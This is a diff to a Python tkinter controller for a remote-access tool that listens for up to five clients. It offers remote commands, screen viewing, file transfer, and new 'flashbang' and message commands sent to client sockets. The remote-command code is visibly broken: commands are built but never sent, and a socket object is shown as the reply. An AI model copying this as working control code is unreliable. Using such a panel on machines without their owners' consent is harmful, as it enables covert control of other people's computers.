@@ -1,5 +1,6 @@
 import tkinter as objTK
 from tkinter import ttk as objTTK
+import dialogueBoxTTK as objDialog
 from tkinter import messagebox as objMessageBox
 from tkextrafont import Font
 import sv_ttk
@@ -16,10 +17,6 @@ clients = ["No Client Connected"] * 5
 client_labels = [None] * 5
 connectionNumThing = str(connectionsNum) + " Connections!"
 client_sockets = [None] * 5
-
-# Please fix the bug
-# what bug?
-# THE FONT ONE YOU DUMBASS
 
 class ScreenSharingServer:
     def __init__(self, master, host='0.0.0.0', port=5001):
@@ -49,14 +46,34 @@ class ScreenSharingServer:
         self.next_button = objTTK.Button(master, text="Next", command=self.next_client, width=20)
         self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)
 
-        self.info_button = objTTK.Button(objHomeTab, text="Next Info", command=self.next_info, width=20)
-        self.info_button.place(x=390, y=155)
+        self.info_button = objTTK.Button(objHomeTab, text="Next Client Log ▶", command=self.next_info, width=20)
+        self.info_button.place(x=385, y=455)
+        # General Commands tab
+        self.flashbangLabel = objTTK.Label(objSettingsTab5, text="FLASHBANG! the client!", font=normalFont)
+        self.flashbangLabel.place(x=20, y=20)
+        self.flashBang = objTTK.Button(objSettingsTab5, text="FLASHBANG!", command=self.flashbang)
+        self.flashBang.place(x=30, y=50)
+        self.messageTheClientLabel = objTTK.Label(objSettingsTab5, text="Message the Client!", font=normalFont)
+        self.messageTheClientLabel.place(x=20, y=100)
+        self.messageTheClientButton = objTTK.Button(objSettingsTab5, text="Message!", command=self.messageTheClient)
+        self.messageTheClientButton.place(x=30, y=130)
 
         self.wait_for_connection()
 
     def wait_for_connection(self):
         threading.Thread(target=self.accept_connection).start()
-
+    def flashbang(self):
+        clientToFlashbang = objDialog.askinteger(title="FLASHBANG!", prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4")
+        client_socket_Selec = self.client_sockets[clientToFlashbang]
+        if client_socket_Selec is not None:
+            client_socket_Selec.send("flashbang".encode('utf-8'))
+    def messageTheClient(self):
+        clientToMessage = objDialog.askinteger(title="Message the Client!", prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4")
+        client_socket_Selec = self.client_sockets[clientToMessage]
+        if client_socket_Selec is not None:
+            message = objDialog.askstring(title="Message the Client!", prompt="Enter the message to send!")
+            messageToSend = f"message{message}"
+            client_socket_Selec.send(messageToSend.encode('utf-8'))
     def accept_connection(self):
         global connectionsNum
         print("Waiting for a connection...")
@@ -79,7 +96,7 @@ class ScreenSharingServer:
                 
                 # Find an empty slot for the client
                 empty_slot = None
-                ipv6 = "wtf no ipv6?"
+                ipv6 = "no ipv6?"
                 for addr_info in socket.getaddrinfo(address[0], None):
                     if addr_info[0] == socket.AF_INET6:
                         ipv6 = addr_info[4][0]
@@ -280,12 +297,14 @@ objSettingsTab1 = objTTK.Frame(tabControl)
 objSettingsTab2 = objTTK.Frame(tabControl)
 objSettingsTab3 = objTTK.Frame(tabControl)
 objSettingsTab4 = objTTK.Frame(tabControl)
+objSettingsTab5 = objTTK.Frame(tabControl)
 
 tabControl.add(objHomeTab, text='Home')
 tabControl.add(objSettingsTab1, text='Remote CMD')
 tabControl.add(objSettingsTab2, text='Screen View')
 tabControl.add(objSettingsTab3, text='File Uploader')
 tabControl.add(objSettingsTab4, text='File Downloader')
+tabControl.add(objSettingsTab5, text='General Commands')
 
 # Home Tab
 themeLabel = objTTK.Label(objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont)
@@ -322,10 +341,10 @@ client_labels[4] = connections5_label
 connections5_label.place(x=40, y=290)
 
 clientInfoFrame = objTK.Frame(objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0)
-clientInfoFrame.place(x=382,y=5, width=500, height=170)
+clientInfoFrame.place(x=382,y=5, width=500, height=440)
 
 clientInfoFrameText = objTK.Text(clientInfoFrame, font=joseFont, bg="#252525", fg="#fff", state="disabled", highlightthickness=0, borderwidth=0, padx=5, pady=5)
-clientInfoFrameText.place(x=0,y=0, width=500, height=170)
+clientInfoFrameText.place(x=0,y=0, width=500, height=440)
 # Remote CMD tab
 class CustomCommandPrompt:
     def __init__(self, master):
@@ -340,10 +359,12 @@ class CustomCommandPrompt:
         self.command_entry.bind("<Return>", self.display_command)
 
     def display_command(self, event):
+        index = 0
         command = self.command_entry.get()
-        self.output_text.config(state="normal")
+        cmdSend = "run" + command
+        response = ScreenSharingServer.client_sockets[index]
         self.output_text.insert(objTK.END, f"$ {command}\n")
-        self.output_text.insert(objTK.END, f"$ No Client Response\n")
+        self.output_text.insert(objTK.END, f"$ {response}\n")
         self.command_entry.delete(0, objTK.END)
         self.output_text.config(state="disabled")
         self.output_text.yview_moveto(1.0)
